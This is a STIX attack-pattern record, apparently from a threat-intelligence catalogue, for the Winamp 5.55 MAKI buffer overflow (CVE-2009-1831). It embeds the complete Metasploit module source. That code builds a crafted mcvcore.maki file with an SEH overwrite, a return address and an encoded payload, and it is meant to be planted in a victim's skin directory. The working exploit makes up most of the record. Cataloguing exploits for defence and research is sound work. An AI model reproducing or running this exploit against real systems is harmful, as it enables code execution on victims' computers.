{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7cac865d-8030-4e24-a98a-4351098a8274",
    "created": "2024-08-14T16:37:00.094572Z",
    "modified": "2024-08-14T16:37:00.094576Z",
    "name": "Winamp MAKI Buffer Overflow",
    "description": " This module exploits a stack based buffer overflow in Winamp 5.55. The flaw exists in the gen_ff.dll and occurs while parsing a specially crafted MAKI file where memmove is used in an insecure way with user controlled data.  To exploit the vulnerability the attacker must convince the victim to install the generated mcvcore.maki file in the \"scripts\" directory of the default \"Bento\" skin or generate a new skin using the crafted mcvcore.maki file. The module has been tested successfully on Windows XP SP3 and Windows 7 SP1.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/winamp_maki_bof.rb",
            "external_id": "winamp_maki_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1831"
        },
        {
            "source_name": "reference",
            "url": "http://vrt-sourcefire.blogspot.com/2009/05/winamp-maki-parsing-vulnerability.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Winamp MAKI Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack based buffer overflow in Winamp 5.55. The flaw\n        exists in the gen_ff.dll and occurs while parsing a specially crafted MAKI file,\n        where memmove is used in an insecure way with user controlled data.\n\n        To exploit the vulnerability the attacker must convince the victim to install the\n        generated mcvcore.maki file in the \"scripts\" directory of the default \"Bento\" skin,\n        or generate a new skin using the crafted mcvcore.maki file. The module has been\n        tested successfully on Windows XP SP3 and Windows 7 SP1.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Monica Sojeong Hong', # Vulnerability Discovery\n          'juan vazquez'\t# Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-1831'],\n          [ 'OSVDB', '54902'],\n          [ 'BID', '35052'],\n          [ 'EDB', '8783'],\n          [ 'EDB', '8772'],\n          [ 'EDB', '8770'],\n          [ 'EDB', '8767'],\n          [ 'URL', 'http://vrt-sourcefire.blogspot.com/2009/05/winamp-maki-parsing-vulnerability.html' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'       => 4000,\n          'DisableNops' => true,\n          'BadChars'    => \"\"\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          # winamp.exe 5.5.5.2405\n          [ 'Winamp 5.55 / Windows XP SP3 / Windows 7 SP1',\n            {\n              'Ret' => 0x12f02bc3, # ppr from in_mod.dll\n              'Offset' => 16756\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2009-05-20',\n      'DefaultTarget'  => 0))\n\n    deregister_options('FILENAME')\n  end\n\n  def file_format_filename\n    'mcvcore.maki'\n  end\n\n  def exploit\n\n    sploit = rand_text(target['Offset'])\n    sploit << generate_seh_record(target.ret)\n    sploit << payload.encoded\n    length_sploit = [sploit.length].pack(\"v\")\n\n    header = \"\\x46\\x47\" # magic\n    header << \"\\x03\\x04\" # version\n    header << \"\\x17\\x00\\x00\\x00\"\n    types  = \"\\x01\\x00\\x00\\x00\" # count\n    # class 1 => Object\n    types << \"\\x71\\x49\\x65\\x51\\x87\\x0D\\x51\\x4A\\x91\\xE3\\xA6\\xB5\\x32\\x35\\xF3\\xE7\"\n    # functions\n    functions = \"\\x37\\x00\\x00\\x00\" # count\n    #function 1\n    functions << \"\\x01\\x01\" # class\n    functions << \"\\x00\\x00\" # dummy\n    functions << length_sploit # function name length\n    functions << sploit # crafted function name\n\n    maki = header\n    maki << types\n    maki << functions\n\n    print_status(\"Creating '#{file_format_filename}' file ...\")\n\n    file_create(maki)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-05-20",
    "x_mitre_platforms": [
        "win'"
    ]
}